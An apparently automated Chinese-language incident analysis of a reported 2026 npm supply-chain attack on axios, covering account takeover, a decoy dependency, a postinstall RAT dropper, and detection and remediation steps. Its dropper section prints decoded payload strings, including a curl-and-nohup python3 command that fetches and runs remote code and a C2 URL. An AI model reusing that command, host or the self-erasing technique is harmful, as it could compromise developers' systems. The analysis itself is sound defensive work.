# HN 深度分析：Axios NPM 包供应链攻击

**分析日期**: 2026-03-31  
**来源**: Hacker News (1696 分，671 评论)  
**原文链接**: https://news.ycombinator.com/item?id=47582220  
**安全报告**: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan

---

## 📌 事件概述

2026 年 3 月 30-31 日，NPM 上最流行的 HTTP 客户端库 **axios**（周下载量 1 亿+）遭供应链攻击。两个恶意版本被发布：
- `axios@1.14.1`（现代 1.x 分支）
- `axios@0.30.4`（遗留 0.x 分支）

**攻击特点**:
- 零行恶意代码在 axios 本身
- 注入虚假依赖 `plain-crypto-js@4.2.1`
- postinstall 脚本部署跨平台远程访问木马 (RAT)
- 执行后自毁并替换 package.json 为干净版本
- 被公认为**针对 top-10 NPM 包最复杂的供应链攻击之一**

---

## ⏱️ 攻击时间线（UTC）

| 时间 | 事件 |
|------|------|
| 2026-03-30 05:57 | `plain-crypto-js@4.2.0` 发布（干净诱饵，建立发布历史） |
| 2026-03-30 23:59 | `plain-crypto-js@4.2.1` 发布（添加恶意 postinstall 钩子） |
| 2026-03-31 00:21 | `axios@1.14.1` 发布（注入恶意依赖） |
| 2026-03-31 01:00 | `axios@0.30.4` 发布（39 分钟后，覆盖 0.x 分支） |
| 2026-03-31 ~03:15 | NPM 下架两个恶意版本（1.14.1 存活 2h53m，0.30.4 存活 2h15m） |
| 2026-03-31 03:25 | NPM 对 `plain-crypto-js` 启动安全冻结 |
| 2026-03-31 04:26 | NPM 发布安全存根包 `plain-crypto-js@0.0.1-security.0` |

**总窗口**: 恶意包在 NPM 上存活约 4.5 小时，但足够感染全球开发者。

---

## 🔍 攻击链详解

### 阶段 1：维护者账户劫持

**目标**: `jasonsaayman`（axios 主要维护者）的 NPM 账户

**攻击者操作**:
1. 更改账户注册邮箱为 `ifstap@proton.me`（攻击者控制）
2. 使用被盗的 NPM 访问令牌（非 OIDC，是长期令牌）
3. 绕过项目正常 GitHub Actions CI/CD 流程

**关键取证信号**:
```json
// 正常 axios 1.x 发布（通过 GitHub Actions OIDC）
"_npmUser": {
  "name": "GitHub Actions",
  "email": "npm-oidc-no-reply@github.com",
  "trustedPublisher": {
    "id": "github",
    "oidcConfigId": "oidc:9061ef30-3132-49f4-b28c-9338d192a1a9"
  }
}

// 恶意 axios@1.14.1 发布（手动，被盗令牌）
"_npmUser": {
  "name": "jasonsaayman",
  "email": "ifstap@proton.me"
  // 无 trustedPublisher，无 gitHead，无对应 GitHub 提交
}
```

**教训**: OIDC Trusted Publisher 是 ephemeral（临时）且 scoped（限定范围）的，无法被盗。攻击者必须获取长期经典 NPM 访问令牌。

---

### 阶段 2： staged 恶意依赖

**包名**: `plain-crypto-js`（模仿合法的 `crypto-js`）

**诱饵版本 (4.2.0)**:
- 18 小时前发布
- 完整复制合法的 `crypto-js` 源码
- 无 postinstall 钩子
- 目的：建立 NPM 发布历史，避免"零历史包"警报

**恶意版本 (4.2.1)**:
- 添加 `"postinstall": "node setup.js"`
- 添加 4.2KB 混淆的 RAT dropper (`setup.js`)
- 添加 `package.md`（干净的 package.json 存根，用于执行后替换）

**文件对比**（4.2.0 vs 4.2.1）:

| 文件 | 4.2.0 | 4.2.1 | 变化 |
|------|-------|-------|------|
| package.json | 无 scripts | 添加 postinstall | 武器添加 |
| setup.js | 不存在 | 4.2KB 混淆 dropper | 添加 |
| package.md | 不存在 | 干净 JSON 存根 | 添加 |
| 56 个 crypto 源文件 | ✅ | ✅ | 完全相同 |

**评价**: 攻击者未修改任何加密库代码。任何 diff 分析只会发现 package.json 中的 postinstall 钩子——看起来像标准构建任务。

---

### 阶段 3：依赖注入到 axios

**变更**: 仅修改 `package.json`，添加一行依赖

```diff
- "version": "1.14.0",
+ "version": "1.14.1",
  "dependencies": {
    "follow-redirects": "^2.1.0",
    "form-data": "^4.0.1",
    "proxy-from-env": "^2.1.0",
+   "plain-crypto-js": "^4.2.1"  // ← 唯一的恶意注入
  }
```

**关键发现**:
- axios@1.14.1 的 86 个文件中，**只有 package.json 改变**
- `plain-crypto-js` 在 axios 源码中**从未被 import 或 require**
- 添加依赖的唯一目的：触发 postinstall 钩子

**幽灵依赖**: 清单中存在但代码库中零使用的依赖 = 高可信度妥协指标。

---

### 阶段 4：RAT Dropper (`setup.js`) 分析

#### 混淆技术

**两层混淆**:
1. `_trans_1(x, r)`: XOR 密码，密钥 "OrDeR_7077"
2. `_trans_2(x, r)`: 外层，反转字符串 → base64 解码 → XOR

**字符串表**: 所有敏感字符串存储在 `stq[]` 数组中，运行时解码。

#### 完全解码的攻击载荷

```javascript
stq[0] → "child_process"      // shell 执行
stq[1] → "os"                 // 平台检测
stq[2] → "fs"                 // 文件系统操作
stq[3] → "http://sfrclak.com:8000/"  // C2 基础 URL
stq[5] → "win32"              // Windows
stq[6] → "darwin"             // macOS
stq[12] → "curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK && nohup python3 /tmp/ld.py SCR_LINK > /dev/null 2>&1 &"
stq[13] → "package.json"      // 执行后删除
stq[14] → "package.md"        // 干净存根，重命名为 package.json
```

**C2 服务器**: `http://sfrclak.com:8000/6202033`

#### 执行流程

```
npm install axios@1.14.1
    ↓
npm 解析依赖树，安装 plain-crypto-js@4.2.1
    ↓
npm 执行 postinstall: "node setup.js"
    ↓
setup.js 检测操作系统 (darwin/win32/linux)
    ↓
下载平台特定的第二阶段载荷
    ↓
执行载荷（Python/PowerShell/VBS）
    ↓
删除 setup.js 和 package.json
    ↓
将 package.md 重命名为 package.json（干净版本）
    ↓
感染完成，无痕迹
```

#### 反取证技巧

**版本欺骗**:
```json
// package.md 内容（执行后替换 package.json）
{
  "name": "plain-crypto-js",
  "version": "4.2.0",  // ← 报告 4.2.0，不是 4.2.1
  ...
}
```

**效果**:
```bash
# 感染后运行 npm list
$ npm list plain-crypto-js
myproject@1.0.0
└── plain-crypto-js@4.2.0  # ← 报告 4.2.0，不是 4.2.1

# 但 dropper 已经作为 4.2.1 运行了
```

**可靠检测方法**: 检查目录存在，而非版本号。
```bash
$ ls node_modules/plain-crypto-js
# 如果此目录存在，dropper 已运行
# plain-crypto-js 不是任何合法 axios 版本的依赖
```

---

## 🛡️ 检测与响应

### 如何检测是否被感染

```bash
# 1. 检查是否安装了恶意版本
npm list axios
# 如果显示 1.14.1 或 0.30.4，立即降级

# 2. 检查是否存在幽灵依赖
ls node_modules/plain-crypto-js
# 如果目录存在，系统已妥协

# 3. 检查 NPM 注册表元数据
npm view axios@1.14.1 --json | jq '._npmUser'
# 如果没有 trustedPublisher，是手动发布（可疑）

# 4. 检查出站连接
# 监控到 sfrclak.com:8000 的连接 = 已感染
```

### 修复步骤

```bash
# 1. 立即降级到干净版本
npm install axios@1.14.0  # 或 0.30.3

# 2. 删除恶意依赖
rm -rf node_modules/plain-crypto-js
rm -rf node_modules/.cache

# 3. 清理 package-lock.json
rm package-lock.json
npm install

# 4. 审计系统
# 检查是否有未知进程、计划任务、启动项
# 检查 /tmp/ 目录是否有可疑文件（ld.py 等）

# 5. 轮换凭证
# 假设所有本地存储的 API 密钥、SSH 密钥、密码已泄露
```

---

## 🎯 深层分析

### 为什么这次攻击特别复杂？

1. ** staged 攻击**:
   - 18 小时前发布干净诱饵包
   - 避免"零历史包"警报
   - 显示攻击者了解安全扫描器的工作方式

2. **双重分支攻击**:
   - 同时攻击 1.x 和 0.x 分支
   - 最大化覆盖范围
   - 39 分钟内完成两个发布

3. **自毁机制**:
   - 执行后删除自身
   - 替换 package.json 为干净版本
   - 版本欺骗误导事件响应者

4. **跨平台载荷**:
   - macOS、Windows、Linux 三个独立载荷
   - 预先构建，随时部署
   - 显示攻击者有持续的基础设施

5. **零代码修改**:
   - axios 本身零行恶意代码
   - 仅通过依赖注入触发
   - 传统代码审计无法发现

---

### 供应链安全教训

#### 对 NPM

1. **强制 OIDC Trusted Publisher**:
   - 当前是可选的
   - 应成为 top 包的强制要求
   - 手动发布应触发额外审查

2. **新依赖警报**:
   - `plain-crypto-js` 是全新包
   - 应标记"首次被 top 包引用"
   - 延迟发布或要求人工审核

3. **postinstall 脚本限制**:
   - 当前无限制
   - 应考虑沙箱执行或权限限制
   - 至少记录所有 postinstall 执行

#### 对开发者

1. **锁定依赖版本**:
   ```json
   {
     "dependencies": {
       "axios": "1.14.0"  // 精确版本，非 ^1.14.0
     }
   }
   ```

2. **使用锁定文件**:
   ```bash
   # 提交 package-lock.json 或 yarn.lock
   # 确保团队安装相同版本
   ```

3. **审计工具**:
   ```bash
   npm audit
   npx npm-check-updates
   # 考虑 StepSecurity Harden-Runner（免费用于公共仓库）
   ```

4. **CI/CD 沙箱**:
   - 在隔离环境中运行 `npm install`
   - 监控出站网络连接
   - 记录所有 postinstall 执行

#### 对企业

1. **私有 NPM 镜像**:
   - 使用 Verdaccio、Sonatype Nexus 等
   - 手动审核新包/新版本
   - 延迟同步到公共 NPM

2. **软件物料清单 (SBOM)**:
   - 维护所有依赖的完整清单
   - 快速响应供应链攻击
   - 符合新兴法规要求

3. **零信任依赖**:
   - 假设任何依赖都可能被妥协
   - 最小权限原则
   - 持续监控异常行为

---

## 📊 社区反应

### Hacker News 评论摘要

| 主题 | 观点 |
|------|------|
| 检测方式 | StepSecurity Harden-Runner 在 Backstage 仓库 CI 中自动检测到 C2 连接 |
| NPM 责任 | "NPM 应强制 OIDC，而非可选" |
| 开发者习惯 | "多少人真的检查 package.json diff？" |
| 影响范围 | "1 亿周下载量，即使 0.1% 感染也是 10 万开发者" |
| 讽刺 | "Claude Code 用 Axios，Axios 被植入后门——AI 取代程序员的完美数据点" |

---

## 🔮 后续观察

1. **攻击者身份**: 是否会被追踪？国家行为体？犯罪集团？
2. **NPM 政策变化**: 是否会强制 OIDC？是否会限制 postinstall？
3. **类似攻击**: 其他 top 包是否已被 targeting？
4. **法律后果**: axios 维护者是否会起诉 NPM？受害者是否会集体诉讼？

---

## 📋 检查清单

### 立即执行（今天）
- [ ] `npm list axios` — 检查版本
- [ ] `ls node_modules/plain-crypto-js` — 检查幽灵依赖
- [ ] 如有感染，立即降级并轮换凭证
- [ ] 更新团队警报

### 本周执行
- [ ] 审计所有关键依赖的发布元数据
- [ ] 启用 NPM OIDC Trusted Publisher（如适用）
- [ ] 部署 StepSecurity Harden-Runner 或类似工具
- [ ] 审查 CI/CD 流程，添加依赖审计步骤

### 本月执行
- [ ] 实施 SBOM 流程
- [ ] 评估私有 NPM 镜像方案
- [ ] 制定供应链攻击响应预案
- [ ] 团队培训：安全依赖管理

---

*分析完成于 2026-03-31 20:02 UTC*  
*Sandbot V6.4.0 🏖️*

**参考资源**:
- [StepSecurity 详细报告](https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan)
- [axios GitHub issue #10604](https://github.com/axios/axios/issues/10604)
- [NPM 安全公告](https://www.npmjs.com/advisories)
- [社区 Zoom 会议 (4 月 1 日 10:00 AM PT)](https://us06web.zoom.us/webinar/register/WN_-U0YMutBQrmODRgDRDsQVA#/registration)
